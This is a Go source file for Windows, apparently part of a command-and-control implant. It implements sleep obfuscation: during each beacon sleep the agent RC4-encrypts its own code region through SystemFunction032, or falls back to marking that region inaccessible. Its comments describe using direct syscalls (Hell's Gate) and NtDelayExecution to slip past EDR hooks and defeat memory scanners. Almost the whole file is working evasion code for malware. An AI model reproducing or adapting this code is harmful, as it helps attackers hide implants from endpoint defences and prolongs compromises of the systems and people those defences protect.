//go:build windows

package main

import (
	"time"
	"unsafe"
)

// ustring is the UNICODE_STRING layout expected by SystemFunction032.
type ustring struct {
	Length        uint16
	MaximumLength uint16
	_             uint32 // padding to 8-byte align Buffer on x64
	Buffer        uintptr
}

// sleepObf is the primary entry point called by the beacon loop.
// It chooses between two obfuscation modes:
//   - Ekko-lite: RC4-encrypt the agent's image region via SystemFunction032,
//     sleep, then RC4-decrypt (same key = self-inverse).
//   - PeFluctuation fallback: flip .text to PAGE_NOACCESS during sleep so
//     memory scanners see inaccessible pages, not shellcode.
func sleepObf(d time.Duration) {
	base, size := selfTextRegion()
	if base == 0 || size == 0 {
		time.Sleep(d)
		return
	}

	// Try Ekko-lite (RC4 via SystemFunction032) first.
	// If SystemFunction032 is unavailable (unlikely on any modern Windows),
	// fall back to PeFluctuation.
	if err := procSystemFunction032.Find(); err == nil {
		sleepEkkoLite(base, size, d)
	} else {
		sleepPeFluctuation(base, size, d)
	}
}

// sleepEkkoLite RC4-encrypts the agent's .text region, sleeps, then decrypts.
//
// All VirtualProtect calls use NtProtectVirtualMemory via direct syscall
// (Hell's Gate) so EDR hooks on VirtualProtect/NtProtectVirtualMemory are
// bypassed. The sleep itself uses NtDelayExecution directly instead of the
// hooker-friendly kernel32!Sleep path.
//
// Key is derived from the region base XOR'd with sleep duration — unique each cycle.
func sleepEkkoLite(base, size uintptr, d time.Duration) {
	key := makeRC4Key(base, d)
	keySlice := key[:]

	regionKey := ustring{
		Length:        uint16(len(keySlice)),
		MaximumLength: uint16(len(keySlice)),
		Buffer:        uintptr(unsafe.Pointer(&keySlice[0])),
	}
	regionData := ustring{
		Length:        uint16(size),
		MaximumLength: uint16(size),
		Buffer:        base,
	}

	// Flip to RW via direct NT syscall so SystemFunction032 can write in-place.
	oldProtect, err := ntProtectSelf(base, size, pageReadWrite)
	if err != nil {
		time.Sleep(d)
		return
	}

	// RC4 encrypt (symmetric — same call decrypts).
	procSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)

	// Restore to RX while sleeping so any stray fetch gets an RX region (not RW).
	ntProtectSelf(base, size, pageExecRead) //nolint:errcheck

	// Sleep via NtDelayExecution direct syscall — avoids Sleep/SleepEx hooks.
	ntDelay(d)

	// Flip back to RW to decrypt.
	ntProtectSelf(base, size, pageReadWrite) //nolint:errcheck
	procSystemFunction032.Call(
		uintptr(unsafe.Pointer(&regionData)),
		uintptr(unsafe.Pointer(&regionKey)),
	)

	// Restore original protection (typically RX).
	ntProtectSelf(base, size, oldProtect) //nolint:errcheck
}

// sleepPeFluctuation changes the agent image region to PAGE_NOACCESS for the
// duration of the sleep via NtProtectVirtualMemory direct syscall. Memory
// scanners that read the region during sleep get an access violation.
func sleepPeFluctuation(base, size uintptr, d time.Duration) {
	oldProtect, err := ntProtectSelf(base, size, pageNoAccess)
	if err != nil {
		time.Sleep(d)
		return
	}

	ntDelay(d)

	ntProtectSelf(base, size, oldProtect) //nolint:errcheck
}

// makeRC4Key builds a 16-byte key from current base address + sleep duration.
// Different each sleep cycle so repeated dumps yield different ciphertext.
func makeRC4Key(base uintptr, d time.Duration) [16]byte {
	ns := uint64(d.Nanoseconds())
	b := uint64(base)
	var k [16]byte
	for i := range k {
		k[i] = byte((b >> (uint(i%8) * 8)) ^ (ns >> (uint(i%8) * 8)))
	}
	return k
}

// MEMORY_BASIC_INFORMATION for VirtualQuery
type memBasicInfo struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

var procVirtualQuery = modKernel32.NewProc("VirtualQuery")

// selfTextRegion returns base + size of the current module's first RX MEM_IMAGE region.
func selfTextRegion() (uintptr, uintptr) {
	hMod, _, _ := procGetModuleHandleW.Call(0) // NULL = current module
	if hMod == 0 {
		return 0, 0
	}
	base := hMod
	var mbi memBasicInfo
	sz := unsafe.Sizeof(mbi)

	for addr := base; ; addr += mbi.RegionSize {
		r, _, _ := procVirtualQuery.Call(addr, uintptr(unsafe.Pointer(&mbi)), sz)
		if r == 0 {
			break
		}
		// MEM_IMAGE=0x1000000, PAGE_EXECUTE_READ=0x20, MEM_COMMIT=0x1000
		if mbi.Type == 0x1000000 && mbi.State == 0x1000 &&
			(mbi.Protect == 0x20 || mbi.Protect == 0x40) {
			return mbi.BaseAddress, mbi.RegionSize
		}
		if mbi.RegionSize == 0 {
			break
		}
	}
	return 0, 0
}
